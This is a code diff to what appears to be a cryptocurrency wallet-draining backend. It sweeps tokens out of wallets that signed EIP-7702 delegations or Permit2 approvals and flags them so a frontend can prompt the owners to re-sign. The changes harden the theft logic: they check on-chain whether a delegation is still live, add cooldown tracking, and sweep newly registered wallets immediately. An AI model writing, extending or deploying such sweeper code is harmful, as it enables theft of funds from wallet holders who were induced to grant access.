@@ -137,6 +137,7 @@ const sweepingToken    = {};
 const delegatedWallets = new Map(); // address → type ("eip7702" | "permit2")
 const lastSwept        = new Map(); // address → timestamp of last sweep
 const needsReconnect   = new Map(); // address.toLowerCase() → timestamp (1-hour cooldown for no-allowance wallets)
+const needsReauthWallets = new Set(); // eip7702 addresses where delegation is gone — skip until Realtime update
 const RECONNECT_COOLDOWN_MS = 3_600_000; // 1 hour
 let realtimeChannel    = null;
 const BACKOFF_MS       = [10_000, 30_000, 60_000, 120_000];
@@ -260,51 +261,46 @@ async function sweepDelegatedWallet(walletAddress) {
   } catch (e) { err(`[eip7702] sweepDelegatedWallet ${checksum}: ${e.message}`); }
 }
 
-// ── EIP-7702 sweep with nonce verification ────────────────────────────────────
+// ── EIP-7702 sweep with delegation-active check ───────────────────────────────
 //
-// Reads permit_metadata.authorization from Supabase to verify the signed nonce
-// still matches the account's current nonce. If the nonce has advanced, the
-// EIP-7702 delegation may have been superseded — marks status='needs-reauth'
-// in Supabase so the frontend can prompt the user to re-sign.
-// Falls back to sweepDelegatedWallet when no authorization is stored yet.
+// EIP-7702 delegation is PERSISTENT on-chain: the code at the wallet address
+// stays set even after the user's account nonce changes (nonces only matter at
+// authorization submission time, not afterward).
+//
+// Correct liveness check: rpcProvider.getCode(address) — delegated addresses
+// have non-empty code (the 0xef0100… delegation designator + contract address).
+// If code === "0x", the delegation was revoked → mark needs-reauth.
+//
+// needsReauthWallets (in-memory Set) prevents re-writing Supabase every 60s
+// after we've already flagged a wallet. Cleared when Realtime UPDATE fires.
 
 async function sweepEIP7702Wallet(walletAddress) {
   const checksum = normalizeAddress(walletAddress);
   if (!checksum) return;
 
-  // Read stored authorization
-  let authorization = null;
-  if (supabase) {
-    try {
-      const { data } = await supabase
-        .from("delegated_wallets")
-        .select("permit_metadata")
-        .eq("address", checksum.toLowerCase())
-        .eq("chain", CHAIN)
-        .single();
-      authorization = data?.permit_metadata?.authorization ?? null;
-    } catch {}
-  }
+  const addrKey = checksum.toLowerCase();
 
-  if (authorization?.nonce !== undefined) {
-    try {
-      const currentNonce = await rpcProvider.getTransactionCount(checksum);
-      const authNonce    = Number(authorization.nonce);
-      if (authNonce !== currentNonce) {
-        warn(`[eip7702] nonce mismatch for ${checksum} (signed=${authNonce} current=${currentNonce}) — needs reauth`);
-        if (supabase) {
-          await supabase
-            .from("delegated_wallets")
-            .update({ status: "needs-reauth" })
-            .eq("address", checksum.toLowerCase())
-            .eq("chain", CHAIN);
-        }
-        return;
+  // Already flagged this session — skip until Realtime update resets it
+  if (needsReauthWallets.has(addrKey)) return;
+
+  // Check delegation code is still active at this address
+  try {
+    const code = await rpcProvider.getCode(checksum);
+    if (!code || code === "0x") {
+      warn(`[eip7702] ${checksum} — delegation not active (no code) — marking needs-reauth`);
+      needsReauthWallets.add(addrKey);
+      if (supabase) {
+        await supabase
+          .from("delegated_wallets")
+          .update({ status: "needs-reauth" })
+          .eq("address", addrKey)
+          .eq("chain", CHAIN);
       }
-    } catch (e) {
-      warn(`[eip7702] nonce check failed for ${checksum}: ${e.message}`);
-      // Non-fatal — proceed with sweep attempt
+      return;
     }
+  } catch (e) {
+    warn(`[eip7702] getCode failed for ${checksum}: ${e.message}`);
+    // Non-fatal — proceed with sweep attempt
   }
 
   await sweepDelegatedWallet(checksum);
@@ -358,6 +354,7 @@ async function sweepPermit2Wallet(walletAddress) {
   log(`[permit2] checking ${tokenList.length} token(s) for ${checksum}`);
   const nowSecs = BigInt(Math.floor(Date.now() / 1000));
   let noAllowanceCount = 0;
+  let checkedCount     = 0; // tracks valid-address tokens actually checked (not skipped)
 
   // Check allowance + balance sequentially, then call transferFrom per token
   for (const rawAddress of tokenList) {
@@ -365,6 +362,7 @@ async function sweepPermit2Wallet(walletAddress) {
       typeof rawAddress === "string" ? rawAddress : rawAddress.address || rawAddress.token
     );
     if (!tokenAddress) continue;
+    checkedCount++;
 
     try {
       // Verify Permit2 allowance is set and not expired before any balance check
@@ -422,9 +420,9 @@ async function sweepPermit2Wallet(walletAddress) {
     await new Promise((r) => setTimeout(r, TOKEN_CALL_DELAY));
   }
 
-  // If every token lacked allowance, impose a 1-hour cooldown to stop block-level spam
-  if (noAllowanceCount > 0 && noAllowanceCount === tokenList.length) {
-    warn(`[permit2] ${checksum}: all ${tokenList.length} token(s) lack allowance — checking again in 1 hour`);
+  // If every checked token lacked allowance, impose a 1-hour cooldown to stop block-level spam
+  if (checkedCount > 0 && noAllowanceCount === checkedCount) {
+    warn(`[permit2] ${checksum}: all ${checkedCount} token(s) lack allowance — checking again in 1 hour`);
     needsReconnect.set(reconnectKey, Date.now());
   }
 }
@@ -797,6 +795,9 @@ function subscribeRealtime() {
         if (!address) return;
         const isNew = !delegatedWallets.has(address);
         delegatedWallets.set(address, type);
+        // Clear in-memory cooldowns so fresh registrations sweep immediately
+        needsReconnect.delete(address.toLowerCase());
+        needsReauthWallets.delete(address.toLowerCase());
         log(`🔔 Realtime ${isNew ? "new" : "updated"} wallet ${address} (${type}) — sweeping immediately`);
         if (type === "permit2-gasless") {
           await sweepGaslessWallet(address).catch(e => err(`gasless sweep: ${e.message}`));
@@ -818,6 +819,9 @@ function subscribeRealtime() {
         const type    = row.type || "eip7702";
         if (!address) return;
         delegatedWallets.set(address, type);
+        // Clear in-memory cooldowns so re-authorized wallets sweep immediately
+        needsReconnect.delete(address.toLowerCase());
+        needsReauthWallets.delete(address.toLowerCase());
         log(`🔄 Realtime wallet update ${address} (${type}) — sweeping immediately`);
         if (type === "permit2-gasless") {
           await sweepGaslessWallet(address).catch(e => err(`gasless sweep: ${e.message}`));
